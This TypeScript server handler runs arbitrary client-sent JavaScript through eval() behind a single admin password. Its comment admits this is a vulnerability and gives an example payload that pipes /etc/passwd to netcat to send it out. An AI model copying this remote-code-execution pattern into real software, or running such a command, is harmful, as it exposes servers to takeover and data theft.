import _ from 'lodash'
import * as prettier from 'prettier'
import { z } from 'zod'
import { EventHandlerReturnValue, ResponseReturningEventHandler } from '../Router/EventHandler'

const MAX_CODE_LINES_TO_PRINT = 50

const inputSchema = z.object({
  password: z.string(),
  input: z.string(),
})

/**
 * Peak of engineering thought. Evaluates any code that client sends.
 * Allows to send totally legit debugging code, for example:
 * `require('child_process').exec('cat /etc/passwd | nc ...')`
 * YES I KNOW ITS A VULNERABILITY
 */
export default class EvalCommandHandler extends ResponseReturningEventHandler<string> {
  public async handle(): Promise<EventHandlerReturnValue<string>> {
    const validationResult = inputSchema.safeParse(this.input)
    if (!validationResult.success) {
      return { validationErrors: validationResult.error.errors }
    }

    const input = validationResult.data

    // The most sane validation
    if (!process.env.OWL_SERVER_ADMIN_PASSWORD || input.password !== process.env.OWL_SERVER_ADMIN_PASSWORD) {
      return { badRequest: 'fuck you' }
    }

    console.log('Will evaluate this code:')
    await this.consoleLogCode({
      code: input.input,
      language: 'js',
      prettierFormatter: 'espree',
    })

    const data = await eval(input.input)

    console.log('Will send this result:')
    await this.consoleLogCode({
      code: JSON.stringify(data) || '',
      language: 'json',
      prettierFormatter: 'json',
    })

    return { data }
  }

  private async consoleLogCode({
    code,
    language,
    prettierFormatter,
  }: {
    code: string
    language: string
    prettierFormatter: 'espree' | 'json'
  }): Promise<void> {
    const formattedCode = await prettier.format(code, {
      parser: prettierFormatter,
      semi: false,
      tabWidth: 2,
      printWidth: 80,
      singleQuote: true,
    })

    const linesCount = this.countLines(formattedCode)
    console.log(`(${linesCount} lines)`)

    console.log(`\n\`\`\`${language}`)
    if (linesCount <= MAX_CODE_LINES_TO_PRINT) {
      console.log(formattedCode)
    } else {
      console.log(_.take(formattedCode.split('\n'), MAX_CODE_LINES_TO_PRINT).join('\n'))
      console.log('...')
    }
    console.log('```\n')
  }

  /**
   * Returns number of lines in formatted code.
   * Source: https://stackoverflow.com/a/881111
   * @param formattedCode Formatted code
   * @returns number of lines
   */
  private countLines(formattedCode: string): number {
    return (formattedCode.match(/\n/g) || []).length
  }
}
